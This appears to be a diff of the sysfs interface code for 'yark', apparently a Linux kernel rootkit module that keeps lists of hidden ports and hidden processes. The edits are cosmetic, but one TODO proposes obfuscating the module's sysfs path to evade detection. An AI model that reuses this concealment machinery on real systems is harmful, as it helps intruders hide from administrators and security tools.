@@ -17,12 +17,16 @@
 #include "hide_proc.h"
 #include "protect_proc.h"
 
-/*
+/**
+ * This file provides a interface to for user-space process to communicate with
+ * the yark kernel module running in kernel-space. The interface is based on
+ * sysfs, by creating a new directory `/sys/kernel/yark/`.
+ *
  * For things about sysfs, see:
  * https://www.kernel.org/doc/Documentation/filesystems/sysfs.txt
  */
 
-// TODO: Obfuscate the this path name at compile time:
+// TODO: We can obfuscate the this path name at compile time:
 #define SYS_DIR_NAME "yark"
 
 /* attribute for hide_port */
@@ -36,14 +40,13 @@ static ssize_t hide_port_kobj_list(struct kobject *kobj,
 
     cur = get_hide_port_info_list_head();
     cur = cur->next;
-    while (cur != NULL)
-    {
+    while (cur != NULL) {
         if (remain_size <= 0)
             break;
         count = scnprintf(buf + offset, remain_size, "%d\n", cur->port);
         remain_size -= count;
         offset += count;
-        cur = cur->next;    
+        cur = cur->next;
     }
     return offset;
 }
@@ -238,14 +241,13 @@ static ssize_t hide_proc_kobj_list(struct kobject *kobj,
 
     cur = get_hide_proc_info_list_head();
     cur = cur->next;
-    while (cur != NULL)
-    {
+    while (cur != NULL) {
         if (remain_size <= 0)
             break;
         count = scnprintf(buf + offset, remain_size, "%d\n", cur->pid);
         remain_size -= count;
         offset += count;
-        cur = cur->next;    
+        cur = cur->next;
     }
     return offset;
 }
@@ -405,5 +407,6 @@ failed:
 void command_end(void) {
     pr_info(LOG_PREFIX "call command_end()\n");
     if (module_kobj)
+        /* release module_kobj */
         kobject_put(module_kobj);
 }
